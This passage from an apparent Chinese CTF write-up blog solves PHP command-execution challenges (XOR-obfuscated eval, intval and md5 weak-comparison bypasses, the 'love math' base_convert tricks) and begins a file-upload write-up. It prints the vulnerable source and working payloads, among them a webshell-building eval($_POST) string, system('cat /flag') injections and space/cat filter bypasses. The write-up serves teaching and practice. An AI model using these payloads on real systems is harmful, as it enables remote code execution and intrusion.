class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这个知识点都要考烂了，先用phpinfo验证一下，直接给payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706133157.png" alt=""></p>
<p>先构造一个shell，用蚁剑连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[_]($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>
<blockquote>
<p>PHP7.0 还可以使用assert来执行php语句，PHP7.1之后就不行了。</p>
</blockquote>
<p>然后再加载<a href="https://github.com/Medicean/as_bypass_php_disable_functions">绕过disable_function的插件</a>，运行readflag即可。</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706135436.png" style="zoom:67%;" />
<h2 id="WUSTCTF2020-朴实无华">WUSTCTF2020 朴实无华</h2>
<h3 id="考点-v7">考点</h3>
<ul>
<li>intval函数绕过</li>
<li>md5弱类型</li>
<li>Linux命令空格和cat绕过</li>
</ul>
<h3 id="解题-v7">解题</h3>
<p>根据hint访问<code>fl4g.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>套娃题，一层一层的来看。</p>
<p>第一层是用科学计数法绕过intval函数的if判断，给一个demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($a);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">$b=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($b+<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 30001</span></span><br></pre></td></tr></table></figure>
<p>这是因为进行+1操作的时候会先将$a的科学计数法解析然后再加1。</p>
<blockquote>
<p>以下只适合php7.0及以下版本</p>
</blockquote>
<p>第二层是md5的弱比较</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">md5值：0e291242476940776845150308577824</span><br><span class="line">0e2159620</span><br><span class="line">md5值：0e2159620</span><br></pre></td></tr></table></figure>
<p>第三层是绕过空格和cat命令，空格的代替方式<code>$&#123;IFS&#125;</code>、<code>$IFS</code>，cat的代替方式<code>ca\t</code>、<code>sort</code>、<code>more</code>等等。</p>
<h2 id="CISCN2019-华北赛区-love-math">CISCN2019 华北赛区 love math</h2>
<h3 id="考点-v8">考点</h3>
<ul>
<li>代码审计</li>
</ul>
<h3 id="解题-v8">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="审计">审计</h4>
<p>可以看到代码对于我们的传参进行了如下限制：</p>
<ol>
<li>
<p>长度限制&lt;80</p>
</li>
<li>
<p>黑名单特殊字符限制</p>
</li>
<li>
<p>正则匹配字符通过白名单验证，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(1)能过</span><br><span class="line">1abs()能过</span><br><span class="line">absa()不能过</span><br><span class="line">abs(a)不能过</span><br><span class="line">abs()a不能过</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中正则匹配字符：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs); </span><br></pre></td></tr></table></figure>
<p>是将<code>$content</code>变量中以字母开头的字符串组成数组储存在<code>$used_funcs</code>变量中。</p>
<p>查看<code>$whitelist</code>我们可以看到两个进制转换函数：</p>
<blockquote>
<ul>
<li>base_convert()：在任意进制之间转换数字（2 - 32 进制)。</li>
<li>dechex()：把十进制数转换为十六进制数。</li>
</ul>
</blockquote>
<p>我们知道<code>32进制</code>包括<code>0-9a-z</code>等字符。所以我们可以通过<code>base_convert()</code>函数利用进制转换构造特定的字符串。</p>
<h4 id="构造payload">构造payload</h4>
<h5 id="方法一">方法一</h5>
<p>由于长度的限制，肯定是要构造<code>&#123;$_GET&#125;&#123;xx&#125;(&#123;$_GET&#125;&#123;yy&#125;)</code>来执行shell。</p>
<blockquote>
<p><code>hex2bin() 函数</code>：把十六进制值的字符串转换为 ASCII 字符。</p>
</blockquote>
<p>首先把<code>$_GET</code>转换为10进制表示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(binascii.b2a_hex(<span class="string">b&#x27;_GET&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="number">1598506324</span></span><br></pre></td></tr></table></figure>
<p>再利用<code>base_convert</code>函数构造<code>hex2bin</code>函数：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703115033.png" style="zoom:67%;" />
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(base_convert(37907361743, 10, 36));</span><br><span class="line">string(7) &quot;hex2bin&quot;</span><br></pre></td></tr></table></figure>
<p>最后，我们就利用<code>dechex</code>函数把10进制表示的<code>$_GET</code>转换为16进制表示，然后传入<code>hex2bin()</code>函数。</p>
<p>所以最后的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<blockquote>
<p>另外一种形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$&#123;$pi&#125;&#123;pi&#125;($&#123;$pi&#125;&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="方法二">方法二</h5>
<p>通过<code>getallheaders()</code>函数，读取写入HTTP request header字段的值。</p>
<p>payload的构造方式和上面一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure>
<p>解释如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">&#x2F;&#x2F;操作xx和yy，中间用逗号隔开，echo都能输出</span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
<h2 id="NESTCTF2019-Love-Math2">NESTCTF2019 Love Math2</h2>
<h3 id="考点-v9">考点</h3>
<ul>
<li>代码审计</li>
<li>Fuzz</li>
</ul>
<h3 id="解题-v9">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和上面的那道题基本上是一样的，但是限制更为严格，参数长度必须小于60，所以那道题的两个方法都不能用，这里再介绍一种Fuzz的脚本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要目的就是想fuzz出<code>_GET</code>字符串。可以把这个字符串拆分成两段。先查找<code>_G</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php fuzz.php | grep _G</span><br><span class="line">is_finite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_infinite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_nan^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_getrandmax^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_rand^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_srand^23&#x3D;&#x3D;&gt;_G</span><br></pre></td></tr></table></figure>
<p>再来查找<code>ET</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php fuzz.php | grep ET</span><br><span class="line">rad2deg^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">rand^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">tan^15&#x3D;&#x3D;&gt;ET</span><br><span class="line">tanh^15&#x3D;&#x3D;&gt;ET</span><br></pre></td></tr></table></figure>
<p>选择函数名最短的即可。最终的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<blockquote>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——文件上传</title>
    <url>/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="极客大挑战-2019-Upload">极客大挑战 2019 Upload</h2>
<h3 id="考点">考点</h3>
<ul>
<li>phtml绕过后缀</li>
<li>script绕过&lt;?</li>
</ul>
<h3 id="解题">解题</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818233431.png" alt=""></p>
<h2 id="ACTF2020-新生赛-Upload">ACTF2020 新生赛 Upload</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>phtml后缀绕过</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818232047.png" alt=""></p>
<h2 id="GXYCTF2019-BabyUpload">GXYCTF2019 BabyUpload</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>.htaccess解析绕过</li>
</ul>
<h3 id="解题-v3">解题</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819085908.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819090013.png" alt=""></p>
<h2 id="RoarCTF-2019-SimpleUpload">RoarCTF 2019 SimpleUpload</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>条件竞争</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>根据报错信息，发现是ThinkPHP3.2.4版本，从GitHub上下载下来审计一下，发现上传模块有一个问题。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819104409.png" alt=""></p>
<p>可以看到，用户所写得代码使用时未指定files，默认为<code>$_FILES</code>，这意味着，所有<code>$_FILES</code>中的文件都会被上传。而代码只会过滤<code>$_FILES['file']</code>中的文件。所以上传两个文件，一个name为file的正常图片，另一个name为其他的webshell。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>最后会打印出<code>$_FILES['file']</code>的文件地址，而不会打印我们shell的地址。</p>
<p>ThinkPHP3默认使用uniqid()函数根据时间生成文件名，两个文件上传时间相近可以爆破。</p>
<p>最后上传的php会被后台替换成flag。</p>
<h2 id="强网杯-2019-Upload">强网杯 2019 Upload</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>PHP反序列化POP链构造</li>
</ul>
<h3 id="解题-v5">解题</h3>
<p>注册之后查看cookie发现是一个base64编码后的</p>
